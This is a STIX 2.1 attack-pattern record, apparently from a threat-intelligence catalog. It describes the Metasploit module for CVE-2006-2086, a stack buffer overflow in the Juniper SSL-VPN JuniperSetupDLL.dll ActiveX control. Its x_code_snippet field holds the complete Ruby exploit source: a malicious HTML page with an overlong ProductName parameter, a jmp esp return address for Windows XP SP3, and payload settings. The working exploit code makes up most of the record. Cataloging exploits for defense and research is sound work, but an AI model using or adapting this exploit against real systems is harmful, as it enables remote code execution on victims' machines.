{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d24e4bf9-f506-4627-a38c-a896326ee6f6",
    "created": "2024-08-14T16:44:50.881175Z",
    "modified": "2024-08-14T16:44:50.88118Z",
    "name": "Juniper SSL-VPN IVE JuniperSetupDLL.dll ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the JuniperSetupDLL.dll library which is called by the JuniperSetup.ocx ActiveX\tcontrol as part of the Juniper SSL-VPN (IVE) appliance. By specifying an overly long string to the ProductName object parameter, the stack is overwritten.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/juniper_sslvpn_ive_setupdll.rb",
            "external_id": "juniper_sslvpn_ive_setupdll.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2086"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/fulldisclosure/2006-04/0743.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Juniper SSL-VPN IVE JuniperSetupDLL.dll ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in the JuniperSetupDLL.dll\n        library which is called by the JuniperSetup.ocx ActiveX\tcontrol,\n        as part of the Juniper SSL-VPN (IVE) appliance. By specifying an\n        overly long string to the ProductName object parameter, the stack\n        is overwritten.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'aushack',\n      'References'     =>\n        [\n          [ 'CVE', '2006-2086' ],\n          [ 'OSVDB', '25001' ],\n          [ 'BID', '17712' ],\n          [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2006-04/0743.html' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'\t\t=>\n        {\n          'Space'\t\t=> 1024,\n          'BadChars'\t=> \"\\x00\\x0a\\x0d\\x20<>()\\\"\\\\\\';@\\#\\%\\`\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'\t\t=> 'win',\n      'Targets'\t\t=>\n        [\n          [ 'Windows XP Pro SP3 English',\t{ 'Ret' => 0x77ae7f99 } ],# crypt32.dll jmp esp\n          [ 'Debugging',\t\t\t{ 'Ret' => 0x44434241 } ],\n        ],\n      'DisclosureDate' => '2006-04-26',\n      'DefaultTarget' => 0))\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize\n    vname = rand_text_alpha(rand(100) + 1)\n\n    # Build the exploit buffer\n    sploit = rand_text_alpha(2200)\n    sploit[220, 4] = [target['Ret']].pack('V')\n    sploit[240, payload.encoded.length] = payload.encoded\n\n    # Build out the message\n    content = %Q|\n      <html>\n      <object classid=\"CLSID:E5F5D008-DD2C-4D32-977D-1A0ADF03058B\" id=\"#{vname}\">\n      <PARAM NAME=\"ProductName\" VALUE=\"#{sploit}\">\n      </object>\n      <script language=\"javascript\">\n      #{vname}.startSession();\n      </script>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-04-26",
    "x_mitre_platforms": [
        "win'"
    ]
}